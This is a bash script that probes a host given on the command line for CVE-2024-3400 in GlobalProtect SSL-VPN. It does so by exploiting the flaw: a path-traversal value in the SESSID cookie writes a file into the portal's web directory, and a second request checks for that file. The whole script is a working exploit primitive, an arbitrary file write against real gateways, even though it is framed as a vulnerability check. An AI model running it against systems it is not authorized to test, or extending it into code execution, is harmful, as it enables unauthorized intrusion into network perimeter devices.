#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'


# First Upload 0 Byte File
response=$(curl -vkL -s -o /dev/null -w "%{http_code}" $1/ssl-vpn/hipreport.esp -H "Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/CVE20243400.txt;")
if [ $response -eq 200 ]; then
    echo "${GREEN}File uploaded${NC}"
else
    echo "${RED}Failed with status code: $response ${NC}"
    exit 1
fi

# Second Verify Uploaded 0 Byte File
response=$(curl -vkL -s -o /dev/null -w "%{http_code}" $1/global-protect/portal/images/CVE20243400.txt)
if [ $response -eq 403 ]; then
    echo "${GREEN}Second file uploaded and vulnerable${NC}"
elif [ $response -eq 200 ]; then
    echo "${RED}Failed with status code: $response ${NC}"
fi

